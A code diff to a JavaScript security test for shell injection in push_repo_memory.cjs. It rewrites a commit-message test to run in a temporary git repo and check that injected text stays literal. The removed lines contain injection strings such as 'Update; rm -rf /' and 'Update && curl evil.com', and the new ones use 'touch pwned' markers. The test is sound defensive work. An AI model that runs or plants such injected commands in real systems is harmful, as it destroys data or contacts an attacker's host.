@@ -1378,24 +1378,32 @@ describe("push_repo_memory.cjs - shell injection security tests", () => {
     });
 
     it("should safely handle malicious commit messages", () => {
-      // Test that malicious commit messages would be treated as literals
-      const maliciousMessages = ["Update; rm -rf /", "Update && curl evil.com", "Update\nmalicious command", 'Update"; echo hacked'];
+      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "repo-memory-commit-message-"));
+      const maliciousMessages = ["Update; touch pwned", "Update && touch pwned", "Update\n touch pwned", 'Update"; touch pwned'];
 
-      // With spawnSync and args array, these would be literal commit messages
-      // No shell interpretation occurs
-      for (const message of maliciousMessages) {
-        const { spawnSync } = require("child_process");
-        // Note: This would fail in actual use because there are no staged changes
-        // But it demonstrates that special characters are treated literally
-        const result = spawnSync("git", ["commit", "-m", message], {
-          encoding: "utf8",
-          stdio: "pipe",
-        });
+      try {
+        execFileSync("git", ["init"], { cwd: tempDir, stdio: "ignore" });
+        execFileSync("git", ["config", "user.name", "Test"], { cwd: tempDir });
+        execFileSync("git", ["config", "user.email", "test@example.com"], { cwd: tempDir });
 
-        // The command would fail (no staged changes), but importantly:
-        // The malicious part of the message should NOT be executed
-        // Special characters like ; && | should be part of the commit message, not shell operators
-        expect(result.status).not.toBe(0);
+        for (const [index, message] of maliciousMessages.entries()) {
+          const filePath = `file-${index}`;
+          fs.writeFileSync(path.join(tempDir, filePath), "test");
+          execFileSync("git", ["add", filePath], { cwd: tempDir });
+
+          const { spawnSync } = require("child_process");
+          const result = spawnSync("git", ["commit", "-m", message], {
+            cwd: tempDir,
+            encoding: "utf8",
+            stdio: "pipe",
+          });
+
+          expect(result.status).toBe(0);
+          expect(execFileSync("git", ["log", "-1", "--format=%B"], { cwd: tempDir, encoding: "utf8" }).trimEnd()).toBe(message);
+          expect(fs.existsSync(path.join(tempDir, "pwned"))).toBe(false);
+        }
+      } finally {
+        fs.rmSync(tempDir, { recursive: true, force: true });
       }
     });
 
